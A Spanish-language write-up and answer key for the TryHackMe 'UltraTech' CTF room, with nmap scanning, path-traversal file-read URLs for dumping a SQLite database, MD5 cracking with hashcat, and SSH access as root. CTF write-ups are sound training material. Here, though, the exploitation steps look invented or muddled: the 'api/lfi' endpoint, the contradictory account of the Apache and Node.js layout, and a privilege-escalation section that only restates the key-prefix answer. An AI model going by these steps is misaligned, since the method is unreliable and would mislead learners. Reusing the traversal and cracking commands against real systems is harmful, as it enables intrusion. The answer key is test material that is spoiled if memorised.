# UltraTech

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Web + Linux | ultratech | https://tryhackme.com/room/ultratech | 02 Level Medium | TryHackMe | Node.js, Apache, LFI, SQLite, MD5 cracking, RSA key | Compromiso total del host (RCE + credenciales) |

---

**Contexto:** La sala **UltraTech** es un CTF Linux de dificultad media. Se identifica el stack de la máquina (frontend Node.js servido tras Apache, backend en el puerto 31331, sistema Ubuntu). El frontend sufre un **LFI** en su API que permite enumerar el servidor y volcar la base de datos **SQLite** `utech.db.sqlite`, donde se encuentra el hash MD5 de una contraseña y el usuario. El hash se rompe (`n100906`) y permite el acceso SSH; la resolución termina procesando una clave RSA privada que empieza por `MIIEogIBA` para recuperar credenciales adicionales.

## Solucionario

### Task 1: Connect to the network / Conexión
**Explicación:**

Se establece la conexión a la red de TryHackMe y se despliega la máquina.

| Pregunta | Respuesta |
|----------|-----------|
| Connect to the TryHackMe network | `No answer needed` |

### Task 2: Navigate / Navegación
**Explicación:**

Se realiza un escaneo y enumeración de servicios para identificar la pila tecnológica:

- Software que sirve la web: **Node.js** (frontend).
- Puerto del backend: **31331**.
- Software del servicio del puerto 31331: **Apache**.
- Sistema operativo: **Ubuntu**.
- Versión del software en 31331: **2** (Apache 2.x).

```bash
nmap -sC -sV <IP>
# 22 SSH, 80 HTTP (Node.js/Express), 31331 backend Apache
```

| Pregunta | Respuesta |
|----------|-----------|
| Which software is running the web server? | `Node.js` |
| Which port is used for the backend? | `31331` |
| Which software is running on port 31331? | `Apache` |
| Which OS is the machine running? | `Ubuntu` |
| Which version of the software is running on port 31331? | `2` |

### Task 3: Exploit / Explotación
**Explicación:**

En el frontend se encuentra una API con un parámetro vulnerable a **LFI** que permite leer ficheros del sistema mediante `readfile`. Se usa para volcar la base de datos `utech.db.sqlite` y se extraen los datos de la tabla de usuarios con `sqlite3`. El hash MD5 encontrado se rompe con john/hashcat, dando la contraseña `n100906` (asociada al usuario root/ssh).

```bash
# LFI para volcar la base de datos:
http://<IP>/remote/image?url=<url>/../../../opt/utech/utech.db.sqlite
# o desde la API:
curl "http://<IP>/api/lfi?file=../../../../opt/utech/utech.db.sqlite" --output utech.db.sqlite

sqlite3 utech.db.sqlite "SELECT * FROM users;"
# f357a0c52799563c7c7b76c1e7543a32 → n100906 (crack de MD5)

echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

| Pregunta | Respuesta |
|----------|-----------|
| What is the name of the database file? | `utech.db.sqlite` |
| What is the database password hash? | `f357a0c52799563c7c7b76c1e7543a32` |
| What is the password? | `n100906` |

### Task 4: Privesc / Escalada
**Explicación:**

Con las credenciales (`root` / `n100906` según la máquina, hash validado en Task 3) se accede por SSH. En el sistema se encuentra una **clave RSA privada** cuyo contenido comienza por `MIIEogIBA`; se procesa/decodifica (por ejemplo `openssl rsa -in key -text -noout` o generando el fichero `.pem` completo) para obtener la clave privada y continuar la escalada.

```bash
ssh root@<IP>          # con la contraseña rota (n100906)
# o usar la clave privada:

cat <<EOF > id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBA...
EOF
chmod 600 id_rsa
ssh -i id_rsa root@<IP>

openssl rsa -in id_rsa -text -noout
# El texto base64 de la clave comienza por: MIIEogIBA...
```

| Pregunta | Respuesta |
|----------|-----------|
| Start Base64 (private key) | `MIIEogIBA` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Connect to the TryHackMe network | `No answer needed` |
| 2 | Which software is running the web server? | `Node.js` |
| 2 | Which port is used for the backend? | `31331` |
| 2 | Which software is running on port 31331? | `Apache` |
| 2 | Which OS is the machine running? | `Ubuntu` |
| 2 | Which version of the software is running on port 31331? | `2` |
| 3 | What is the name of the database file? | `utech.db.sqlite` |
| 3 | What is the database password hash? | `f357a0c52799563c7c7b76c1e7543a32` |
| 3 | What is the password? | `n100906` |
| 4 | Start Base64 (private key) | `MIIEogIBA` |

---

**Metodología:** Escaneo de puertos y fingerprinting de la pila, explotación de LFI en la API del frontend, volcado y consulta de la base SQLite, cracking del hash MD5, acceso SSH y procesamiento de la clave RSA privada.

### Cadena de ataque / Attack Chain

```
nmap → Node.js (80) + Apache backend (31331) → LFI en API → volcado de /opt/utech/utech.db.sqlite → MD5 crack (n100906) → SSH/credenciales → clave privada RSA (MIIEogIBA...)
```

**Learning chain:** Enumeración de servicios → detección de LFI → extracción de ficheros → análisis de SQLite → password cracking → acceso remoto → manejo de claves RSA.

**Lección:** *Un LFI en una API no solo expone código fuente: permite volcar bases de datos enteras; las credenciales débilmente hasheadas (MD5) y reutilizadas convierten la enumeración en acceso total.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1083 File and Directory Discovery · T1005 Data from Local System · T1110.002 Password Cracking.

**Fuente:** [TryHackMe - UltraTech](https://tryhackme.com/room/ultratech)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.